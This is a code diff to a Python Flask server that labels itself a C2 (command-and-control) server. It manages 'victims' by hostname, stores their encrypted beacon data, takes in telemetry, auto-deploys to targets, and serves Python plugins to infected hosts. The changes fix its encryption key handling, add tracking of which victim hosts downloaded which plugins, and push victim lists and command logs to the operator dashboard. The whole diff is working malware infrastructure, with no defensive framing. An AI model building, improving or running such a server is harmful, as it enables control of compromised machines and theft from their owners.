@@ -3,6 +3,7 @@ import json
 import re
 import threading
 import hashlib
+import base64
 import logging
 from datetime import datetime
 
@@ -97,6 +98,15 @@ def init_db():
             created_at TEXT NOT NULL
         )
     """)
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS plugin_downloads (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            hostname TEXT NOT NULL,
+            plugin_name TEXT NOT NULL,
+            downloaded_at TEXT NOT NULL,
+            UNIQUE(hostname, plugin_name)
+        )
+    """)
     conn.commit()
     conn.close()
 
@@ -106,7 +116,7 @@ def _derive_key(password: str, salt: bytes) -> bytes:
 
 
 def _derive_fernet(password: str, salt: bytes) -> Fernet:
-    return Fernet(_derive_key(password, salt).hex().encode())
+    return Fernet(base64.urlsafe_b64encode(_derive_key(password, salt)))
 
 
 VERIFY_PLAINTEXT = b'RogueByteOK'
@@ -255,7 +265,10 @@ def get_victim(hostname: str) -> dict:
     if not row:
         return None
     _hostname, encrypted, last_seen = row
-    data = decrypt_data(encrypted)
+    try:
+        data = decrypt_data(encrypted)
+    except Exception:
+        return None
     return {
         'last_seen': last_seen,
         'data': data.get('beacon_data', {}),
@@ -482,6 +495,33 @@ def _list_plugins() -> list:
     return results
 
 
+def _log_plugin_download(hostname: str, plugin_name: str):
+    import sqlite3
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "INSERT OR REPLACE INTO plugin_downloads "
+        "(hostname, plugin_name, downloaded_at) VALUES (?, ?, ?)",
+        (hostname, plugin_name, now)
+    )
+    conn.commit()
+    conn.close()
+
+
+def _get_plugin_downloads() -> dict:
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    rows = conn.execute(
+        "SELECT plugin_name, hostname FROM plugin_downloads "
+        "ORDER BY plugin_name, hostname"
+    ).fetchall()
+    conn.close()
+    result: dict[str, list[str]] = {}
+    for pname, hname in rows:
+        result.setdefault(pname, []).append(hname)
+    return result
+
+
 @app.before_request
 def auth_check():
     if require_auth():
@@ -530,7 +570,7 @@ def telemetry():
                 if entry:
                     socketio.emit('command_log_update', {'entry': entry[0]})
         else:
-            logger.info("Telemetry from %s (locked — not stored)", hostname, data.get('status'))
+            logger.info("Telemetry from %s (locked — not stored)", hostname)
 
     if hostname and hostname in auto_deploy_targets:
         agent = (data.get('agent') or '').lower()
@@ -730,11 +770,16 @@ def download_plugin(name):
     if crypto is None:
         return jsonify({'error': 'server locked'}), 401
     safe = os.path.basename(name)
-    path = os.path.join(PLUGIN_DIR, safe)
-    if not safe.endswith('.py') or '..' in safe:
+    if '..' in safe or '/' in safe or '\\' in safe:
         return jsonify({'error': 'invalid name'}), 400
+    if not safe.endswith('.py'):
+        safe = safe + '.py'
+    path = os.path.join(PLUGIN_DIR, safe)
     if not os.path.exists(path):
         return jsonify({'error': 'not found'}), 404
+    hostname = request.args.get('hostname', '')
+    if hostname:
+        _log_plugin_download(hostname, safe.replace('.py', ''))
     with open(path) as f:
         return f.read(), 200, {'Content-Type': 'text/x-python'}
 
@@ -774,6 +819,13 @@ def delete_plugin():
     return jsonify({'error': 'not found'}), 404
 
 
+@app.route('/api/extensions/status', methods=['GET'])
+def plugin_status():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    return jsonify(_get_plugin_downloads())
+
+
 SHUTDOWN_KEY = os.environ.get('C2_SHUTDOWN_KEY', 'shutdown')
 
 
@@ -800,7 +852,14 @@ def login():
     if not password:
         return jsonify({'error': 'password required'}), 400
     if unlock_crypto(password):
+        victims = get_all_victims()
+        logs = get_command_log(limit=50)
         socketio.emit('server_unlocked', {'success': True})
+        socketio.emit('dashboard_state', {
+            'victims': victims,
+            'logs': logs,
+            'auto_deploy_targets': list(auto_deploy_targets),
+        })
         return jsonify({'status': 'ok', 'message': 'unlocked'})
     return jsonify({'error': 'invalid password'}), 403
 
@@ -814,7 +873,14 @@ def setup():
     if not password or len(password) < 4:
         return jsonify({'error': 'password must be at least 4 characters'}), 400
     setup_crypto(password)
+    victims = get_all_victims()
+    logs = get_command_log(limit=50)
     socketio.emit('server_unlocked', {'success': True, 'first_time': True})
+    socketio.emit('dashboard_state', {
+        'victims': victims,
+        'logs': logs,
+        'auto_deploy_targets': list(auto_deploy_targets),
+    })
     return jsonify({'status': 'ok', 'message': 'crypto configured'})
 
 
@@ -1003,5 +1069,7 @@ def serve_spa(path=''):
 
 if __name__ == '__main__':
     debug_mode = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true', 'yes')
-    logger.info("C2 Server starting on http://0.0.0.0:4444 (debug=%s)", debug_mode)
+    needs = _needs_setup()
+    logger.info("C2 Server starting on http://0.0.0.0:4444 (debug=%s, locked=%s, needs_setup=%s)",
+                 debug_mode, crypto is None, needs)
     socketio.run(app, host='0.0.0.0', port=4444, debug=debug_mode)
